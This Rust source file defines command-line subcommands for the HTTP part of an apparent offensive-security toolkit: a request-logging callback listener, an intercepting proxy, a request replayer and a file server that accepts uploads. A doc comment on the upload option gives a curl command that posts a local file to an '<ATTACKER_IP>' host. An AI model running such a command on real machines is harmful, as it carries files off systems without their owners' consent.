use std::net::{IpAddr, Ipv4Addr};
use std::path::PathBuf;

use clap::Subcommand;

mod callback;
mod proxy;
mod send;
mod serve;

use self::proxy::HttpProxyFormat;
use crate::http::target::HttpTarget;

#[derive(Debug, Subcommand)]
pub(super) enum HttpProxyRulesCommand {
    /// Print an example proxy rules configuration to stdout
    Example,
}

#[derive(Debug, Subcommand)]
pub(super) enum HttpProxyCommand {
    /// Proxy rules utilities
    #[command(arg_required_else_help = true)]
    Rules {
        #[command(subcommand)]
        command: HttpProxyRulesCommand,
    },
}

#[derive(Debug, Subcommand)]
pub(super) enum HttpCommand {
    /// Start an HTTP listener that logs incoming requests
    Callback {
        /// Local IP address to listen on
        #[arg(long, default_value_t = IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)))]
        ip: IpAddr,
        /// Local TCP port to listen on
        #[arg(long, default_value_t = 9000)]
        port: u16,
    },
    /// Inspect, intercept, modify, and forward/drop HTTP traffic.
    ///
    /// Starts a local HTTP proxy that allows requests
    /// to be inspected, modified, forwarded, or dropped.
    ///
    /// Configure your browser or HTTP client to use the proxy.
    ///
    /// HTTPS is not supported yet.
    #[command(args_conflicts_with_subcommands = true)]
    Proxy {
        #[command(subcommand)]
        command: Option<HttpProxyCommand>,
        /// Local IP address to bind the proxy to
        #[arg(long, default_value_t = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)))]
        ip: IpAddr,
        /// Local port to listen on
        #[arg(long, default_value_t = 8080)]
        port: u16,
        /// Select rules to filter and modify HTTP traffic
        #[arg(long)]
        rules: Option<PathBuf>,
        /// Watch rules file for changes and automatically reload
        #[arg(long, requires = "rules")]
        watch_rules: bool,
        /// The format to use when printing requests to stdout.
        #[arg(long, default_value_t = HttpProxyFormat::Summary)]
        stdout_format: HttpProxyFormat,
        /// Dump requests to file
        #[arg(long)]
        dump: Option<PathBuf>,
        /// The format to use when dumping requests
        #[arg(long, default_value_t = HttpProxyFormat::Text)]
        dump_format: HttpProxyFormat,
    },
    /// Send a request
    #[command(arg_required_else_help = true)]
    Send {
        /// Target URL
        target: HttpTarget,
        /// Path to a saved HTTP request to repeat
        file: PathBuf,
        // /// Open the request file in the interactive HTTP editor
        // #[arg(short, long)]
        // interactive: bool,
        /// Save normalized response headers and unpacked body to this path instead of stdout
        //#[arg(short, long, requires = "file", conflicts_with = "interactive")]
        #[arg(short, long)]
        output: Option<PathBuf>,
    },
    /// Serve files over HTTP (and optionally accept uploads)
    Serve {
        /// Local IP address to listen on
        #[arg(long, default_value_t = IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)))]
        ip: IpAddr,
        /// Local TCP port to listen on
        #[arg(long, default_value_t = 8000)]
        port: u16,
        /// Directory to serve
        #[arg(long, default_value = ".")]
        dir: PathBuf,
        /// Accept file uploads (PUT/POST) and save them at `<dir>/uploads/<filename>`.
        ///
        /// Command example: `curl -X POST --data-binary "@<path-to-file>" -H "X-Filename: <file-name>" http://<ATTACKER_IP>:<PORT>/upload`.
        #[arg(long, default_value_t = false)]
        upload: bool,
    },
}

impl HttpCommand {
    pub(super) async fn run(self) -> Result<(), Box<dyn std::error::Error>> {
        match self {
            Self::Callback { ip, port } => callback::run(ip, port).await?,
            Self::Proxy {
                command,
                ip,
                port,
                rules,
                watch_rules,
                stdout_format,
                dump,
                dump_format,
            } => match command {
                Some(HttpProxyCommand::Rules { command }) => match command {
                    HttpProxyRulesCommand::Example => proxy::rules_example().await?,
                },
                None => {
                    proxy::run(
                        ip,
                        port,
                        rules,
                        watch_rules,
                        stdout_format,
                        dump,
                        dump_format,
                    )
                    .await?
                }
            },
            Self::Send {
                target,
                file,
                output,
            } => send::run(target, file, output).await?,
            Self::Serve {
                ip,
                port,
                dir,
                upload,
            } => serve::run(ip, port, dir, upload).await?,
        }

        Ok(())
    }
}
